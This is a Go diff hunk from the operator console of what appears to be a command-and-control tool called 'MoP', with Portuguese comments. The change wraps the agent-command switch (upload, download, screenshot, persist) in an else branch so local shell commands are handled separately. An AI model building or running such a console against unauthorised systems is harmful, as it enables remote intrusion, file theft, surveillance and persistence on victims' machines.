@@ -70,62 +70,63 @@ func cli() {
 					output, _ := exec.Command("/bin/sh", "-c", hostCommand).CombinedOutput()
 					fmt.Println(string(output))
 				}
-			}
-			switch baseCommand {
-			case "help":
-				fmt.Println(commands.Help())
-			case "show":
-				// handler para as variações do comando show do pacote commands
-				commands.ShowHandler(slicedCommand, selectedAgent)
-			case "alias":
-				// handler para as variações do comando show do pacote commands
-				if selectedAgent != "" {
-					commands.SetAlias(slicedCommand, selectedAgent)
-				} else {
-					fmt.Println("You need to select an agent!")
-				}
-			case "select":
-				// seleciona um agente com a validação do pacote commands
-				selectedAgent = commands.SelectHandler(slicedCommand)
-				if selectedAgent != "" {
-					term = selectedAgent + "@MoP# "
-				} else {
-					term = "MoP> "
-				}
-			case "upload":
-				if selectedAgent != "" {
-					commands.UploadFile(selectedAgent, slicedCommand)
-					commands.CommandHandler(selectedAgent, command)
-				} else {
-					fmt.Println("You need to select an agent!")
-				}
-			case "download":
-				if selectedAgent != "" {
-					commands.DownloadFile(selectedAgent, slicedCommand)
-					commands.CommandHandler(selectedAgent, command)
-				} else {
-					fmt.Println("You need to select an agent!")
-				}
-			case "screenshot":
-				if selectedAgent != "" {
-					commands.TakeScrenshot(selectedAgent, slicedCommand)
-					commands.CommandHandler(selectedAgent, command)
-				} else {
-					fmt.Println("You need to select an agent!")
-				}
-			case "persist":
-				if selectedAgent != "" {
-					commands.CommandHandler(selectedAgent, command)
-				} else {
-					fmt.Println("You need to select an agent!")
-				}
-			default:
-				if selectedAgent != "" {
-					commands.CommandHandler(selectedAgent, command)
-				} else {
-					fmt.Println("You need to select an agent!")
-				}
+			} else {
+				switch baseCommand {
+				case "help":
+					fmt.Println(commands.Help())
+				case "show":
+					// handler para as variações do comando show do pacote commands
+					commands.ShowHandler(slicedCommand, selectedAgent)
+				case "alias":
+					// handler para as variações do comando show do pacote commands
+					if selectedAgent != "" {
+						commands.SetAlias(slicedCommand, selectedAgent)
+					} else {
+						fmt.Println("You need to select an agent!")
+					}
+				case "select":
+					// seleciona um agente com a validação do pacote commands
+					selectedAgent = commands.SelectHandler(slicedCommand)
+					if selectedAgent != "" {
+						term = selectedAgent + "@MoP# "
+					} else {
+						term = "MoP> "
+					}
+				case "upload":
+					if selectedAgent != "" {
+						commands.UploadFile(selectedAgent, slicedCommand)
+						commands.CommandHandler(selectedAgent, command)
+					} else {
+						fmt.Println("You need to select an agent!")
+					}
+				case "download":
+					if selectedAgent != "" {
+						commands.DownloadFile(selectedAgent, slicedCommand)
+						commands.CommandHandler(selectedAgent, command)
+					} else {
+						fmt.Println("You need to select an agent!")
+					}
+				case "screenshot":
+					if selectedAgent != "" {
+						commands.TakeScrenshot(selectedAgent, slicedCommand)
+						commands.CommandHandler(selectedAgent, command)
+					} else {
+						fmt.Println("You need to select an agent!")
+					}
+				case "persist":
+					if selectedAgent != "" {
+						commands.CommandHandler(selectedAgent, command)
+					} else {
+						fmt.Println("You need to select an agent!")
+					}
+				default:
+					if selectedAgent != "" {
+						commands.CommandHandler(selectedAgent, command)
+					} else {
+						fmt.Println("You need to select an agent!")
+					}
 
+				}
 			}
 		}
 
